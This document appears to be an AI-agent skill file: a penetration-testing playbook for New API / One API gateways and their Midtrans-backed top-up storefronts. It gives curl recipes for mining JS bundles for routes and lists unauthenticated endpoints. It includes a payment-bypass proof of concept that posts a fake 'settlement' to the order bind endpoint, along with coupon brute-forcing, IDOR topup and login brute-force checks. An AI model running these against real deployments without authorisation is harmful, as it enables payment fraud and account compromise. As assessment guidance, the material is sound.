---
name: ai-api-gateway-security
description: Assess deployments of New API / One API (and forks) — AI API routers / gateways ("Unified AI API gateway" SPAs) and their Midtrans-backed storefront subdomains (topup.* / shop.*). Covers target identification, JS-bundle route mining, the misleading /api/setup root_init guard, /api/status info disclosure, login rate-limiting checks, storefront payment-bypass PoC (Midtrans bind), coupon/redeem & IDOR-topup testing, and non-destructive PoC discipline.
---

# AI API Gateway Security — New API / One API Assessment

## Purpose
Assessment playbook for AI API gateway products built on **New API** (a fork of *One API*). These are commonly deployed as `router.*`, `api.*`, `ai.*` subdomains offering an OpenAI-compatible proxy plus an admin dashboard. The SPA is React behind Cloudflare; the real attack surface is the `/api/*` JSON backend.

## Identify the target
- HTML `<title>New API</title>`, meta description "Unified AI API gateway and admin dashboard".
- React SPA behind Cloudflare (cf-ray edge in response headers); JS bundles under `/static/js/` with hashed names (`index.<hash>.js`, `814.<hash>.js`).
- Ecosystem often split across `topup.*`, `chat.*`, `admin.*` subdomains — verify passively via headers only, don't assume they're in scope.

## Recon: JS-bundle route mining (no katana/httpx needed)
Faster than crawling when the bundle is listed in HTML:
```bash
curl -s "https://TARGET/" | grep -oE '/static/js/[a-zA-Z0-9_.-]+\.js'
curl -s "https://TARGET/static/js/index.<hash>.js" -o /tmp/bundle.js
grep -oE '"/api/[a-zA-Z0-9_/{}.$-]+"' /tmp/bundle.js | sort -u
```
This typically surfaces 60+ candidate routes in seconds. Pair with an authenticated token to discover privileged routes not visible unauthenticated.

## Endpoint catalog (observed)
- **Unauth-reachable:** `GET /api/status` (info disclosure), `GET /api/notice`, `GET /api/setup` (state only), `GET /api/pricing`, `GET /api/channel/fetch_models` (often 401).
- **Auth-required (token):** `/api/channel/*`, `/api/user/manage`, `/api/models/*`, `/api/option/*`, `/api/performance/*`, `/api/deployments/*`, `/api/ratio*`, `/api/system-task/*`, `/api/authz/catalog`, `/api/user/self`.
- **Auth flows:** `POST /api/user/login`, `POST /api/user/register`, `POST /api/user/refresh`.
- **OpenAI-compat:** `/v1`, `/v1/models`, `/v1/chat/completions` — require Bearer token; dummy key → `{"error":{"message":"Invalid token"}}`.

## Known findings & pitfalls
1. **Info disclosure — `GET /api/status` (Medium, CVSS 5.3).** Unauthenticated JSON leaks `github_client_id`, `telegram_bot_name`, passkey RP config (`passkey_rp_id`, `passkey_origins`), pricing internals (`price`, `stripe_unit_price`, `usd_exchange_rate`, `quota_per_unit`), feature flags, `register_enabled`. Remediation: gate behind auth or strip sensitive keys.
2. **Registration Flow Weaknesses:**
   - **No CAPTCHA:** Registration form lacks CAPTCHA, enabling automated account creation (bot abuse).
   - **No Email Verification:** Auto-login after registration without email verification, allowing fake account creation.
   - **Weak Password Policy:** Accepts simple passwords (e.g., `TestPass123!`), increasing brute-force risk.
   - **Test Workflow:** Use browser automation to submit test registrations (e.g., `testuserN@example.com`) and observe behavior (auto-login, rate-limiting, etc.).
2. **No rate limit on `POST /api/user/login` (Medium, CVSS 5.3).** 6 rapid failures → all HTTP 200, no `429`/`Retry-After`/lockout → brute-force / credential-stuffing risk. `turnstile_check` often `false`.
3. **Misleading `root_init:false` on `GET /api/setup` (INFO, do NOT report as critical).** Looks like the classic unauthenticated admin-setup CVE, but `POST /api/setup` is guarded ("系统已经初始化完成", `success:false`). PoC to create admin is BLOCKED on patched instances. Verify by attempting login with the attempted creds — expect failure (no artifact created).
4. **CORS `allow-origin:*` + `allow-credentials:true` (INFO, not exploitable).** Browsers reject wildcard+credentials; no XSS-side data theft. Recommend strict origin allowlist.
5. **Register requires email verification** — `POST /api/user/register` returns "Email verification is enabled, please enter email address and verification code" when email/code omitted. Cannot self-register without a working verification path.

## Storefront / payment-flow testing (the `topup.*` subdomain)
Many New API deployments split commerce into a **separate Node/Express storefront** (typically `topup.<domain>` or `shop.<domain>`), linked from `/api/status` (`topup_link`) and the notice modal. This app is NOT New API — it renders a vanilla SPA from a **single `app.js?v=N` bundle** and uses **Midtrans** for payments (look for `https://midtrans.com` / `app.midtrans.com/snap` references in the HTML). Test it as a distinct attack surface.

### Discover the storefront API (single-bundle mining)
Unlike the React SPA, the storefront ships one minified `app.js`. `awk`/regex over minified blocks often fail — mine by **line number** then read the context:
```bash
curl -s "https://TOPUP/" | grep -oE '(src|href)="[^"]+"'        # find /app.js?v=N
curl -s "https://TOPUP/app.js?v=N" -o /tmp/topapp.js
grep -n "fetch('/api" /tmp/topapp.js                            # locate call sites
# then read_file /tmp/topapp.js offset=<line-10> limit=60  to see the payload shape
```

### Storefront endpoints (observed)
- `GET /api/skus` — full product/subscription catalog (no auth).
- `POST /api/coupon/validate` — body `{code, sku, email, base_amount}`; redeem/coupon logic.
- `GET /api/user-check?username=` — verifies a router username exists.
- `POST /api/order` — body `{sku, name, email, wa, username?, coupon_code?}` → returns Midtrans `snap_token`, `amount_rp`, `fee_rp` (server-computed).
- `GET /api/order/:token` — order status (`pending`/`paid`, `bound`, `paid_at`).
- `POST /api/order/:token/bind` — called after Midtrans success; body `{transaction_id, transaction_status, fraud_status, payment_type}`.

### Payment-bypass PoC (test whether `bind` trusts the client)
This is the highest-value storefront vector. Midtrans status normally arrives via webhook/`bind`; if the server accepts a **client-supplied** `transaction_status:"settlement"` without gateway verification, an attacker gets quota/credit without paying.
```bash
# 1. create unpaid order
ORD=$(curl -s -X POST https://TOPUP/api/order -H "Content-Type: application/json" \
  -d '{"sku":"payg-5","name":"x","email":"you@test.com","wa":"08123456789"}')
TOK=$(echo "$ORD" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"//')
# 2. attempt fake settlement
curl -s -X POST "https://TOPUP/api/order/$TOK/bind" -H "Content-Type: application/json" \
  -d '{"transaction_id":"FAKE-001","transaction_status":"settlement","fraud_status":"accept","payment_type":"bank_transfer"}'
# SAFE target response: order stays status:"pending", bound:false. (server verified with Midtrans)
# VULNERABLE response: status:"paid"/bound:true → report as payment-bypass / business-logic flaw.
```
**Always verify the negative** (no quota granted) by re-reading `GET /api/order/:token` and the router `/api/user/self` quota before/after — a real bypass must show credit without payment.

### Other storefront vectors (all SAFE on the tested target)
- **IDOR topup-to-victim:** `POST /api/order` with `subs` sku + a *different* `username`. Server validates the router username server-side ("username tidak ditemukan") → rejects unknown names. Confirm before assuming redirectable credit.
- **Price/quota tampering:** server derives `amount_rp`/`fee_rp`/`quota` from `sku`; client only sends `sku`. Tampering the order body has no effect.
- **Coupon/redeem brute:** `POST /api/coupon/validate` with common codes (PROMO, DISKON, WELCOME, TEST, VIP…) → all "Kode kupon tidak ditemukan". Requires a valid issuer code; no unauthenticated free-discount.
- **SQLi:** `user-check?username=` and `coupon` code both sanitize input gracefully (no injection on tested target).
- **SKU catalog disclosure (Low, CVSS ~4.3):** `GET /api/skus` leaks `plan_id`, `quota`, `face` (USD), `rp` (IDR), `daily` limits unauthenticated. Low sensitivity (public storefront) — note as informational/Low.

### Router-side commerce endpoints (regular users)
`/api/user/subscription`, `/api/user/redeem`, `/api/user/affiliate` exist but return `403 AUTH_INSUFFICIENT_PRIVILEGE` for `group:regular`. Feature-gated correctly — don't report as broken access control unless you can reach them as a normal user.

### Username ≠ email pitfall
The router username is **separate** from the login email. `GET /api/user/self` returns both (`username:"user_demo"` vs `email:"user@example.com"`). For `user-check` / topup `username` fields, use the **router username**, not the email.

## SPA / Cloudflare false-positive elimination (CRITICAL)
React SPAs behind Cloudflare serve the same `index.html` for every unknown route. `HTTP 200` does NOT mean the file exists.
- Symptom: `/.env`, `/config.json`, `/swagger`, `/debug`, `/.git/config`, `/metrics`, `/healthz`, `/version` all return `200` with identical byte size and `Content-Type: text/html`.
- Before flagging any "exposed file", verify:
  ```bash
  ct=$(curl -s -o /tmp/x -w "%{content_type}" -m 10 "https://TARGET$PATH")
  echo "ct=$ct bytes=$(wc -c </tmp/x)"
  # Real files => text/plain, application/json, image/*, etc. SPA fallback => text/html with large fixed size.
  ```

## Non-destructive PoC discipline
- Attempt setup/admin-creation PoCs, then VERIFY no artifact was created (login with the creds; expect failure).
- Never modify/delete production data; if you must create a test account, delete it afterward.
- Keep rate low (sequential, ~10 req/s) to avoid Cloudflare 403/429 during recon.

## Reference material
- `references/storefront-payment-poc.md` — copy-paste curl recipes for storefront API mapping, Midtrans payment-bypass PoC, IDOR-topup, coupon brute, and SQLi smoke tests.
- `references/new-api-gateway.md` — (existing) route catalog and finding detail.

## Report format (this user's preference)
- Lead with an **Executive Summary table** (#, Finding, Severity, Status).
- Each finding: CVSS v3.1 (full vector), Evidence (raw request/response), Impact, Remediation, Reproduction block.
- One consolidated markdown file per target. See the `reporting` skill for the standard template.
